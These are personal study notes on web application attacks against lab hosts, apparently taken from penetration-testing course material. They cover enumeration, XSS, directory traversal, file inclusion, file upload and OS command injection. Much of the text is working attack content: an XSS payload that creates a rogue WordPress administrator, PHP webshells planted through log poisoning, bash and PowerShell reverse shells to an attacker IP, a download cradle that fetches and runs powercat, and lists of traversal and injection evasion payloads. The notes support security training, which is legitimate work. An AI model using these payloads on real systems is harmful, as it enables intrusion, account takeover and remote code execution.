# Assessment Tools
## Fingerprinting Webservers with NMAP
Nmap can be a got to tool for enumeration
`nmap -sV -p 80 <ip> ` will grab the banner of the web page --> from this we can see the version of server running
We can take enumeration furhter by running service specific NMAP scripts like http-enum
```shell
nmap -p 80 --script=http-enum 192.168.50.20
```
## Wappalyzer
We can passively gather info via Wappalyzer
Navigate to https://www.wappalyzer.com/ and search the domain

## Directory Brute Frorce
We can bruteforce directories with the Gobuster tool
Gobuster supports many modes. Basic Syntax:
```shell
gobuster <mode> -u <ip or url> -w <wordlist>
```
Modes:
- dir: Brute force directories 
- dns: discover subdomains
- s3: discover Amazon s3 buckets
- vhost: discover virtual hosts on the server
- fuzz: fuzz value or name of a parameter
	- ```gobuster fuzz --url [https://example.com/?parameter=FUZZ] --wordlist [path/to/file]```
	- `gobuster fuzz --url [https://example.com/?FUZZ=value] --wordlist [path/to/file]`
Flags:
-u: url
-r: follow redirects
-v: verbose
-U: username for auth
-P: Password for auth
-c: cookie for auth
-t: threads
## Burpsuite
### Proxy tool
We can use the proxy to intercept any traffic before it is passed on to the server
Set up proxy in firefox:
	In Firefox, we can do this by navigating to **about:preferences#general**, scrolling down to _Network Settings_, then clicking _Settings_.
	Let's choose the _Manual_ option, setting the appropriate IP address and listening port. In our case, the proxy (Burp) and the browser reside on the same host, so we'll use the loopback IP address 127.0.0.1 and specify port 8080.

Now we can see all of the details off packets sent and received by the server
### Repeater
We can send requests to the repeater to edit and resend traffic
### Intruder
we can use the intruder to brute force login attempts
- send POST request to the intruder
- press clear to remove all positioner symbols
- highlight desired field and hit add
- load or paste password attempts into payloads
- if an attempt gives status code 302 an attempt was successful
# Web App Enumeration
## Debugging page content
We can look for file extensions in the url --> this could show us what language the application was written in
Better clues can be found in the web page itself. Especially with the use of a debugger
- JavaScript Frameworks
- hidden input fields
- comments
- client side html controls
- More
We can also use the inspector tool to see where input field map to in the html code
## Inspecting HTTP Response Headers
We can either use the burpsuite proxy, or our browser's own Network tool to inspect packets for more information
Launch Network tool from Web Developer Menu in Firefox. We can see all network activity form **after** the tool launches.
Click on web request to get more detail about it
	Server Header usually displays the server software, and sometimes version
	Non Standard headers use X-. Some of these might be useful to identify the underlying stack
Sitemaps may also be useful --> these tell web crawlers which URLs to crawl
Additionally, Robots.txt may be useful. This usually lists sites to not crawl, which are usually sensitive pages.
## Enumerating and abusing APIs
We can use gobuster to bruteforce API endpoints
API paths are often followed by a version number, resulting in patterns such as /api_name/v1
API names are usually descriptive about the data it is handling or the function it is doing
with this info we can use the pattern gobuster feature to try and brute force API paths
	-p: provides a file with patterns
	in this case we can make a simple file
		{GOBUSTER}/v1
		{GOBUSTER}/v2
`gobuster dir -u http://192.168.50.12:5002 -w /usr/share/wordlists/dirb/big/txt -p pattern`
Sometimes when navigating to URLs where API is found we can discover some of the documentation
If the API discloses any users we can try to bruteforce logins. Additionally we can try to bruteforce the subdirectories under a username's path
	`gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt`
To Bruteforce logins, first we need to check if we can log in over the API
	try to curl the any page we may be able to log in on
		this may throw a 405 error of method not supported. By default curl uses GET
	We need to try interacting with POST or PUT
First we can try the login method to see if we are able t verify credentials being overwritten
`curl -i http://192.168.50.16:5002/users/v1/login`
Depending on the error message, this could verify we are able to login using the method
If verified, we can try and login using a dummy password for a valid username known
	We specify a new header of Content type: application/json with -H
	Specify json data via -d
	`curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login`
If this fails we can try other methods such as trying to register as a new user
`curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register`
based on feedback from this request more fields may be required. Tweak request until we can successfully register a user.
Once we know we can register, try registering a user using the admin:True value
	We shouldn't be able to do this but maybe the API is misconfigured
	`curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register`
If there are no error messages, we can try to log in and see if we get an auth token --> if we do, we can go furhter by attempting to change the admin user password
```shell
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```
If this doesn't work we may need to explicitly define using a PUT method
```shell
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

We can recreate these steps all within burpsuite
	append --proxy 127.0.0.1:8080 to the end of the curl login command to send it to the proxy 
	send request to the repeater tab
	We can modify this requst to test multiple APIs
We can visit Target--> sitemap within burpsuite to keep track of all the APIs we've tested

whatweb is a tool that can identify technologies being used on a a website.
## Cross site Scripting
Stored XSS, aka persistent xss, occurs when the exploit payload is stored in a database or cached by the server
Refelcted XSS attacks are usually include a payload in a crafetd request or link. This only attacks the person visiting the link
### Javascript Refresher
Javascript is used to make webpages more interactive
Like many programming languages, Javascript  can combine a set of instructions into a function
We don't need to assign variable types since java is a loosely typed language
We can use the console under Dev tools to test Javascript code
### Identifying XSS vulnerabilities
Identify any fields that take user input and use it as output on the next page
	Search bars
Use special characters to test whether the input is sanitized
` < > ' " { } ; ` These characters work best to test this
	Html uses \< and \> to denote elements
	Javascript uses { } in function declarations
	 '  and  " are used to denote strings
	 ;  are used to mark the end of statements
 we want to see if these characters get URL encoded (%20) or HTML encoded "\<" (where they are referenced as is instead of interpreted)
 If we can inject these elements into the page, the browser will treat them as code elements. We can build begin to build code that will execute once the browser loads it
 We may need to use different characters depending on where our code is being injected
	 If our code is being injected in between \<div\> tags we will need \<  \>to create script tags
	 If input is being added within an existing Javascript tag we may only need quotes and semi colons
### Basic XSS
Using the offsec wp as an example:
if we inspect the source code we see the site using a .php file to store data to a database
We can download the file and see the expected format of the data being sent to the wp db
```php
function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
				$table_name,
				array(
					'patch' => $_SERVER["REQUEST_URI"],
					'datetime' => current_time( 'mysql' ),
					'useragent' => $_SERVER['HTTP_USER_AGENT'],
					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
				)
			);
}
```
php function is responsible for parsing various http headers including  User-Agent
Each time an admin loads the the Visitor plugin the function will execute the code from start.php:
```php
$i=count(VST_get_records($date_start, $date_finish));
foreach(VST_get_records($date_start, $date_finish) as $record) {
    echo '
        <tr class="active" >
            <td scope="row" >'.$i.'</td>
            <td scope="row" >'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
            <td scope="row" >'.$record->patch.'</td>
            <td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
            <td>'.$record->useragent.'</td>
        </tr>';
    $i--;
}
```
we can see that the user agent field is retrieved from the db without sanitization
we can use Burp to generate a user agent value to inject html code. In this case we can set User-Agent: `<script>alert(58)<\script>`
which will cause a popup when the admin console is opened --> we can use this for more malicious purposes
### Privilege escalation via xss
Things we can do with XSS
Steal cookies
	If a website has poor configuration we can capture cookies and use them to authenticate
	Interested in the flags "Secure" and "Http Only"
	Secure flag instructs the broswer to only send the cookie over encrypted connection --> this protects the cookie
	Httponly flag instructs the browser to deny any java script access to the cookie. If this flag is not set we can use an xss payload to steal a cookie
	Session cookies cannot be stolen by java in xss attacks since they are sent by http
Example: if we log into the offsec wp as admin we see all of the cookies have httponly set. Therefore the previously identified vector isn't good for stealing the cookies
Instead we need to try a different attack --> we need to try and retreive the nonce used for the cookie via JS function
we can use the following JS function to capture the nonce:
```Javascript 
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
This function opens a new Http request towards the address /wp-admin/user-new.php
Then it saves the nonce value provided in the repsonse
Now we can craft a function for creating a new admin user
``` javaScript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
This will use the nonce value to auth as admin and create a new admin account
before we use this we need to minify and encode it --> we can do this using JSCompress and console
	Navigate to JSCompress in web browser
	paste code and select compress.
	copy code to console and use the following function:
``` Javascript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
This loop will convert each character to the corresponding utf-16 integer code (==I Think we can do this in burp==)
Make sure we have burp proxy running with intercept on
in terminal execute the following command
```shell
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(<OUTPUT FROM PREVIOUS FUNCTION>))</script>" --proxy 127.0.0.1:8080
```
This will instruct the curl command to send our malicious payload to using a specially crafted http request
inspect the payload in Burp to verify it is correct and send
Once the admin clicks the visitors plugin a malicious user will be created
**The Short**
- Identify java code we want to execute for xss vulnerability
- minify
- encode and copy output
- use curl to send encoded functions


# Information Disclosure
Information Disclosure, also known as information leakage, is when a website reveals sensitive information to its users. Information may include:
- Data about other users, such as usernames or financial information
- Sensitive commercial or business data
- technical details about website and infrastructure
Some basic examples are as follows
- Revealing the names of hidden directories, their structure, and their contents via a `robots.txt` file or directory listing
- Providing access to source code files via temporary backups
- Explicitly mentioning database table or column names in error messages
- Unnecessarily exposing highly sensitive information, such as credit card details
- Hard-coding API keys, IP addresses, database credentials, and so on in the source code
- Hinting at the existence or absence of resources, usernames, and so on via subtle differences in application behavior
Common Sources
- Files for web crawlers
	- robots.txt
	- sitemap.xml
- Directory listings
- Developer comments
- Error messages
- Debugging Data
	-  Values for key session variables that can be manipulated via user input
	- Hostnames and credentials for back-end components
	- File and directory names on the server
	- Keys used to encrypt data transmitted via the client
	- Using TRACE to see internal headers
- Backup files
- Version control history
	- exposed .git directory

# Directory Traversal
## Absolute vs relative path
Absolute - Full file path, Need to use '/' before path to start at root file system
relative - searches in current directory, no '/' in front

if we wanted to access /etc/passwd from our home directory we can use ../../etc/passwd
we can use as many ../ as we want. It becomes arbitrary once we reach the rpoot of the file system
../../../../../../../../../../etc/passwd has the same result as above --> this is useful if we don't know where we are in the filesystem
## Identifying and exploiting
Check for direcotry traversal vulnerability by hovering over all buttons and inspecting all links, navigating to all accessible pages, and examining source code
For Example  `https://example.com/cms/login.php?language=en.html`
- We see the webpage is running php
- We can try to navigate directly to https://example.com/cms/en.html
	- If we can navigate to it we can use this parameter to try other file names
- We see the webapp contains the directory cms, which is running in a subdirectory of the web root
Another example site: `http://mountaindesserts.com/meteor/index.php`
After navigating around the site we notice a few things
- Using php
- a lot of the buttons just link back to the page we are on --> not useful
- link labeled admin at the bottom --> visit link --> new url `http://mountaindesserts.com/meteor/index.php?page=admin.php`
	- We see there is a page parameter to load the admin page
	- We get an error message --> this means info is displayed on the same page
- Navigate directly to `mountaindesserts.com/meteor/admin.php` --> we get the same error message
	- indicates this web page includes content under the page parameter still --> we can use this to test for directory traversal
-  Navigate to `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd ` --> we see the /etc/passwd file
We can also recover other sensitive info like the other user's ssh keys --> usually stored in /home/user/.ssh
We can navigate the the desired address in the web browser and if it works use curl to download the key
`curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
We can save the private key to a file called dt_key and use it to ssh into the box
`ssh -i dt_key -p 2222 offsec@mountaindesserts.com
-i option let's us specify the private key to ssh
remember to chmod 400 the private key so it has the proper permissions

We can also try to use an absolute file path if dir traversal sequences are being filtered



On Windows we can test for this vulnerability by trying to read  C:\Windows\System32\drivers\etc\hosts --> this file is readable by all local users. If we can read it a vuln exists and we can try to recover sensitive data
FInding sensitive info on windows is a little more difficult than linux --> if we can identify services running we should research where logs and configs are stored

When using curl we can use the flag '--path-as-is' to make sure our address is sent as types

## Encoding Special Characters
Since '../' is a known way to abuse directory traversal many sites sanitize it
To get around this we can use URL Encoding (percent encoding)
`curl http://192.168.50.16/cgi-bin/../../../../etc/passwd` becomes `curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`

## Evading filters
We can try using an absolute file path to evade filters

Try submitting nested traversal sequences
`filename=....//....//etc/passwd`
`filename=....\/etc/passwd`

Try submitting encoded sequences
url encoding: `%2e%2e%2f`
double url encoding: `%252e%252e%252f`
`..%c0%af` or `..%ef%bc%8f`, may also work.

try including the intended base folder
`filename=/var/www/images/../../../etc/passwd`

null byte termination before expected file extension
`filename=../../../etc/passwd%00.png`

# File Inclusion Vulnerabilities
## Local File Inclusion
File inclusion vulnerabilities allow us to include a file  in the application's running code. This is different form directory traversal vulnerabilities which give s access to files on the target machine
Since we can include files in an application's code we can also display files
The goal of LFI is to obtain RCE
One method to do this is **log poisoning** --> we can modify data we send to a web app so that the logs contain executable code
To do this we need to know what info is controlled by us and saved in the apache logs  --> we need to either use LFI to display the file or read documentation to understand this
In this example we use LFI to display the log and see the contents
```shell
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
Output:
```
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```
We see that the User Agent is logged --> we can modify this header with burp to log executable code
- Navigate to the admin page --> need to go to a regular page so it logs
- Intercept the traffic in Burp and Modify User Agent to `Mozilla/5.0 <?php echo system($_GET['cmd']); ?>` 
This snippet accepts a command via the cmd parameter and executes it using the system function --> we can supply the command in subsequent requests
To do this successfully we need to still specify the page and use the  '&' delimiter to also specify 'cmd'
To execute  command our address will look like this, ps command used in example
`/meteor/index.php?page=../../../../../../../var/log/apache2/access.log&cmd=ps`
In our response we should get the output of ps --> this verifies the exploit works
We can now send traffic to this address and change the command to run anything we want
Let's try a reverse shell:
``` bash
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```
==Note the above command won't work since php natively spawns a Bourne Shell (sh)==
To get php the runa  bash shell we ned to execute the following command
```sh
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
and we URL encode it
```sh
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

There are some differences with conducting LFI attacks against Windows
- php code wwill function on both Linux and windows --> OS independent
- File Location will be different
	-  For example, on a target running XAMPP the Apache logs can be found in C:\\xampp\\apache\\logs\\.

Other Frameworks vulnerable to LFI and RFI
	 _Perl_,[11](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn11) _Active Server Pages Extended_,[12](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn12) _Active Server Pages_,[13](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn13) and _Java Server Pages_.[14](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn14) Exploiting these kinds of vulnerabilities is very similar across these languages.

Files to try to include
- /etc/passwd
	- get usernames
- ssh keys
- config files that contain passwords
	- look up how to change password for software to find file
- bash / cmd history
	- can expose creds or pivot points
- 

## PHP Wrappers
PHP wrappers are a variety of ways to ehance the php language --> more capabilities we can use to exploit
**php://filter** - displays the contents of a file with or without encoding --> we can use this to display the contents of executable files instead of running them
When examining Mountain Desserts website we notice that the close body tag is missing from wha we can see in the browser --> this indicates that php code is executing server side to finish the page --> we can try to use php filters to see the source
php filter uses resource to specify the file to read. We can also specify absolute or relative paths
```shell
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```
the output of this command is the same as running it without the wrapper --> this is because the code is listed, but then still executed --> we need to use encoding
we add `conver.base64-encode` to the previous command to use base64 encoding
```shell
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
This gets us the previously hidden code in a base 64 encoded string
we can use the base64 command to decode
`echo "<string>" | base64 -d`
This will output the code in plain text
These php files might contain credentials or make us aware to further vulnerabilities in the system

**data://** - used to embed data elements as plaintext or base64 data in running web app code --> this can allow us to execute code when we cannot poison a local file with php
we can try to embed a small snippet of url encoded php into the web app
```shell
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```
the output includes the ls command which shows we can successfully use the File inclusion vuln and data wrapper.
Sometimes web apps have filters for security and will filter on common attack commands like system --> we can use base64 encoding
```shell
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

==data:// will not work with the default php installation== --> we need *allow_url_include* setting to se be enabled
## Remote File Inclusion (RFI)
RFI allows us to include files from a remote system over http or SMB. The included file is also executed in the context of the web application
we can discover RFI vulnerabilities using the same techniques for directory traversal and lfi
==Kali includes several php webshells under /usr/share/webshells/php== --> these can be used for RFI
For this example we will use the simple-backdoor.php webshell which takes a command through the command parameter like the php snippet we used before
we need to host the webshell somewhere so it is accessible --> use `python3 http.server`
we then use curl to invoke the rfi vuln
```shell
curl "http://mountaindesserts/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

# File Upload Vulnerabilities
## Using executable files
We can make educated guesses to locate file upload mechanisms
if the website is a Content Manager System (CMS) we can often upload profile pictures or create blog posts with documents
Sometimes mechanisms are not obvious to users so we should make sure to fully enumerate a website
Once we identify an upload mechanism we can start to probe it to see how well it is configured
- can we upload unintended file types
- Are any file types blocked

Obfuscation Techniques
- Try to upload php files with lesser used php file types --> good concept for any web scripting language
- Try capitalizing some letters in the file extension --> many filters are only filtering on the lowercase version
.htaccess trick
	if certain files are disallowed or unknown extensions aren't rendered, we can try to upload a ".htaccess" file to map our unknown extension to the page type we want. This can bypass extension filters, since we are uploading an unknown extension

Once we upload a file we can use curl or navigate to the webpage to get it to execute
```shell
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```
==When executing commands on windows host make sure to use the correct slashes==

If we know the underlying host is windows we can use Powershell one liners for reverse shells --> since we have many special characters in this we need to encode it.
The following powershell commands show how to do this in powershell
```PowerShell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit
```
We can copy off the output of $EncodedText to use as a command for our webshell
```shell
curl "http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```
This should allow us to receive a reverse shell in Netcat

==If we can upload files to arbitrary parts of the system, we can upload files that are hosted by the website==
for example on an aspx website we can upload the cmdasp.apx web shell where the default website root is. Then we can navigate to the webshell and execute commands on the system --> requires you to look up directory structure of underlying system and software to make sure you put it somewhere to navigate to


## Non Executable Files
In situations where we cannot execute an uploaded file we need to leverage other vulnerabilities to abuse the file upload mechanism --> we can use Directory traversal for example
Test to see what types of files we can upload
We can try to upload files using the relative path to blindly overwrite files --> We have no way of knowing if the files are properly sanitized on the server side
Execution
- Upload a file and capture POST request in Burp
- Send request to repeater
- modify filename parameter so it contains as many "../" as desired
- Send -> Note despite getting an okay response  that shows the malicious filepath the web server might have sanitized it server side
One file to blindly over write is authorized_keys for ssh access
since we can't enumerate users we have to try this for root --> well confgured machines shouldn't allow root access via ssh, but this might be the only user option
- Create a new key pair using ssh-keygen
- copy public key to "authorized_keys"
- try to upload and overwrite file
- attempt to ssh in using the newly generated key
# OS Command Injection
Sometimes Websites will give us the ability to specify commands
COmmands are usually filtered, but we can verify this by trying to run arbitrary commands
On the mountaindesserts website we see that it wants us to run git clone
run the command once to get the http history in Burp proxy --> we can identify the structure of the request and either send it to the repeater or use curl
We see the app is using the archive parameter to specify the command --> we need to use curl in the folowing format:
```shell
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
```
Let's try to run ipconfig instead --> it is blocked by the command filter
Let's see if we can run any git command --> try git version --> it works and we see we are on windows
Now let's try to abuse shell/cmd syntax to embed our malicious command
We can use a url encoded semi colon, %3B, to try and run multiple commands
```shell
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```
It works. Both commands were run --> now we need to find out if we are in cmd or powershell
==We can use the following command to determine if we are in cmd or powershell==
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
This will output what terminal we are in
Make sure we url encode this
in the example we idnetify powershell --> Let's use Powercat (a powershell version of netcat) to get a reverse shell
- host powercat on webserver
- use command injection to download and execute powerat
In plaintext the command will look like this:
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```
 The first part uses a PowerShell download cradle to load the Powercat function contained in the **powercat.ps1** script from our web server. The second command uses the _powercat_ function to create the reverse shell with the following parameters: **-c** to specify where to connect, **-p** for the port, and **-e** for executing a program.
 Then we URL encode special charatcers and use the technique we discovered with curl
 ```shell
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive```
 ```
This connects back to us with a reverse shell. 

## GET Example
In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:
```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```
Due to legacy systems it does this by running an application and passing the parameters as arguments
`stockreport.pl 381 29`
we can supply the command separator `&` to run commands --> **not the only separator we can use**
```
https://insecure-website.com/stockStatus?productID=381&whoami&storeID=29
```

## Separators to try
```
&
&&
|
||
-----UNIX Only---------
;
0x0a
\n
`<command>`
$(<command>)

```

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command.

==Good Resource== https://github.com/payloadbox/command-injection-payload-list --> we may need to encapsulate commands in special characters to get them to work
- try single and/or double quotes
- try putting & before bash commands

## Blind Injection
Blind vulnerabilities can be exploited but different techniques are required.
As an example, imagine a website that lets users submit feedback about the site. A server side application generates an email to send feedback to an admin using the mail program
`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`
### Timing delays
we can try to use `ping` to cause a time delay
`<separator> ping -c 10 127.0.0.1 &`

### Output Redirection
We can try to redirect output into a file accessible within the webroot.
For example, if the application serves static resources from the filesystem location `/var/www/static`, then you can submit the following input:
`& whoami > /var/www/static/whoami.txt &`

### out-of-band (OAST)
We can use command injection to trigger an out of band network interaction with a system we control
You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
`& nslookup kgji2ohoyw.web-attacker.com &`

This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.




# Java Deobfuscation
HTML is used to determine  website's main field and parameters
CSS is used to determine design
Javascript is used to perform functions for the website

Can begin by viewing source code for the website. 
CSS determined either internally or externally --> same concept applies to java script. We should be able to see the JS defined internally or visit the script for JS defined externally

Javascript  is an interpreted language. It is run without being compiled. Python PHP are other examples. JS usually runs client side
Tools are usually used to obfuscate code
## Obfuscation techniques
**Code Minification** - puts all JS code on one line
**Code Packing** - attempts to convert all words and symbols of the code into a list or dictionary and then refer to them using the packed function during execution
![[Pasted image 20250606115848.png]]
This still doesn't get rid of cleartext strings
We can also use Base64 encoding to obfuscate strings
There are other tools to make more complex obfuscations, but this tends to impact runtime of JS code
## Deobfuscation
### Beautify
Beautifying code is basically de minifying code --> lines may still be obfuscated
Can access through browser dev tools
Open browser dev console --> click on JS code --> click '{ }'  button on bottom of console to pretty print JS code
Furthermore, we can utilize many online tools or code editor plugins, like [Prettier](https://prettier.io/playground/) or [Beautifier](https://beautifier.io/)
These tools will only pretty print code

### Deobfuscate / Unpacking
There are many online tools that can unpack JS code
One good tool is [UnPacker](https://matthewfl.com/unPacker.html).
Another way of `unpacking` such code is to find the `return` value at the end and use `console.log` to print it instead of executing it.

## Code analysis
Once code is deobfuscated we can start analyzing its function.
We can try to see if it is reaching out to undocumented endpoints if makig a web request

## Decoding
### Base64
**Base 64** : usually used to reduce the number of special characters. Only uses alphanumeric characters and '+' , '/' Padding uses the character '='. All Base64output will be a multiple of 4

Encoding - we can use the `base64` command
```shell-session
echo https://www.hackthebox.eu/ | base64
```

decoding - we can use ` base64 -d`
```shell-session
echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d
```

### Hex
Hex encoding chnages each character to its hex order in the ASCII table, a = 61, b =62, ...
Any string encoded in hex will comprise of hex charatcers only 0-9, a-f

Encoding we can use the `xxd -p` command
```shell-session
echo https://www.hackthebox.eu/ | xxd -p
```

Decoding we can use the command `xxd -p -r`
```shell-session
echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r
```

### Rot13
rot13 aka Caesar cipher rotates alphabetic characters by a set number for all characters
special charatcers are still not chnaged so we may be able to idenitfy potential strings with rot13 applied

use tools to decode

### Other Encodings
There are hundreds of other encoding methods we can find online. Even though these are the most common, sometimes we will come across other encoding methods, which may require some experience to identify and decode.

==If you face any similar types of encoding, first try to determine the type of encoding, and then look for online tools to decode it.==

Some tools can help us automatically determine the type of encoding, like [Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier). Try the encoded strings above with [Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier), to see if it can correctly identify the encoding method.



# Injection Attacks
XPath Injection - XML Path Language is a query language for XML data, similar to how SQL is a query language for data. XPath is used to query data from XML documents. XPath Injection vulnerabilities arise when  user input is not properly sanitized

LDAP Injection - LDAP is a protocol used to access directory servers. Web apps often use LDAP queries toi enable integration with AD services.

HTML Injection in PDF Generators - many web applications implement functionality to convert data to a PDF format with the help of PDF generation libraries. These libraries read HTML code as input and generate a PDF file from it. This allows the web application to apply custom styles and formats to the generated PDF file by applying stylesheets to the input HTML code. Often, user input is directly included in these generated PDF files. If the user input is not sanitized correctly, it is possible to inject HTML code into the input of PDF generation libraries, which can lead to multiple vulnerabilities, including `Server-Side Request Forgery` (`SSRF`) and `Local File Inclusion` (`LFI`).

## Xpath
The data in an XML document is formatted in a tree structure consisting of `nodes` with the top element called the `root element node`.
Nodes will have one parent node, but can arbitrary number of child nodes.
We can traverse the tree upwards or downwards from a given node to determine all `ancestor nodes` or `descendant nodes`.
Each XPath query selects a set of nodes from the XML document. A query is evaluated from a `context node`, which marks the starting point. Therefore, depending on the context node, the same query may have different results. Here is an overview of the base cases of XPath queries for selecting nodes:

|Query|Explanation|
|---|---|
|`module`|Select all `module` child nodes of the context node|
|`/`|Select the document root node|
|`//`|Select descendant nodes of the context node|
|`.`|Select the context node|
|`..`|Select the parent node of the context node|
|`@difficulty`|Select the `difficulty` attribute node of the context node|
|`text()`|Select all text node child nodes of the context node|
example queries

|Query|Explanation|
|---|---|
|`/academy_modules/module`|Select all `module` child nodes of `academy_modules` node|
|`//module`|Select all `module` nodes|
|`/academy_modules//title`|Select all `title` nodes that are descendants of the `academy_modules` node|
|`/academy_modules/module/tier/@difficulty`|Select the `difficulty` attribute node of all `tier` element nodes under the specified path|
|`//@difficulty`|Select all `difficulty` attribute nodes|

**Note:** If a query starts with `//`, the query is evaluated from the document root and not at the
